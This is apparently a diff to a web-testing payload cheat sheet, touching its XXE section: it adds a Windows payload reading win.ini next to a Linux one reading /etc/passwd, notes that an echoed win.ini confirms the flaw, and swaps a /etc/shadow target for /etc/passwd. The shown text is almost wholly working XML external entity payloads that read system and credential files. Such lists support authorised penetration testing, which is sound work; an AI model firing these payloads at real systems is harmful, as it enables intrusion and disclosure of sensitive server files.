@@ -190,16 +190,32 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 --------------------------------------------------------------------------------------------------------------
 # XXE common payloads
 ### XXE: read local files
+  `linux`
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE foo [  
 <!ELEMENT foo (#ANY)>
 <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
 ```
+  `windows`
+ ```xml
+  <?xml version = "1.0"?>
+  <!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///windows/win.ini"> ]>
+<order>
+  <quantity>1</quantity>
+  <item>
+&exploit;
+</item>
+  <address>USA</address>
+  </order>
+ ```
+If the output of the `win.ini` file on the target returns the response message, then it proves that the XML External Entity vulnerability is present.
+  
+  
 ### use replace funtion if case sensitive
 ```xml
 <!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///etc/shadow"> ]>
+<!DOCTYPE replace [<!ENTITY exploit SYSTEM "file:///etc/passwd"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&exploit;</lastName>
